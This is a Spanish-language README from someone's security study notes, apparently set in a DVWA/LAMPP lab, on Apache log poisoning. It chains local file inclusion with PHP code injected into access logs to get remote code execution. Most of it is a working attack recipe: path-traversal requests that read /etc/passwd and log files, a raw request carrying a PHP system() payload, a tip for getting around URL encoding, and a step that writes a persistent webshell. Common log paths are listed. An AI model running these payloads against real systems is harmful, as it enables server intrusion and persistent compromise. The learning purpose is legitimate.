# Log Poisoning

RCE combinando LFI con inyección de código PHP en los logs de Apache.

---

## Ficheros

| Fichero | Contenido |
|---|---|
| `LogPoisoning.txt` | Guía completa — concepto, flujo, path traversal, bypass URL encode, escalada |

---

## Concepto

Dos vulnerabilidades encadenadas:

```
LFI (?page=) + Apache access_log escribible
         ↓
Inyectar <?php system(...) ?> en el log via URL
         ↓
Incluir el log via LFI → PHP lo interpreta → RCE
```

---

## Flujo rápido

```bash
# 1. Confirmar LFI
?page=../../../../etc/passwd

# 2. Confirmar acceso al log
?page=../../../../opt/lampp/logs/access_log

# 3. Inyectar payload (BurpSuite, SIN URL encode)
GET /vulnerabilities/<?php system($_GET['error']) ?> HTTP/1.1

# 4. Ejecutar comandos
?page=../../../../opt/lampp/logs/access_log&error=id

# 5. Escalar a webshell
?page=...access_log&error=echo '<?php system($_GET["cmd"]); ?>' > /ruta/shell.php
```

> ⚠️ La petición con el payload DEBE interceptarse con BurpSuite y enviarse **sin URL encode**. Si el navegador encodea `<`, `>`, `?` el log guarda `%3C%3F...` y PHP no lo interpreta.

---

## Rutas de log habituales

| Entorno | Ruta |
|---|---|
| DVWA / LAMPP | `/opt/lampp/logs/access_log` |
| Linux estándar | `/var/log/apache2/access.log` |
| CentOS / RHEL | `/var/log/httpd/access_log` |

---

## Diferencia con webshell via SQLi

| Técnica | Requiere | Ventaja |
|---|---|---|
| SQLi `INTO OUTFILE` | FILE priv en MySQL | Limpio, controlado |
| Log Poisoning | LFI + logs legibles | Funciona sin SQLi |
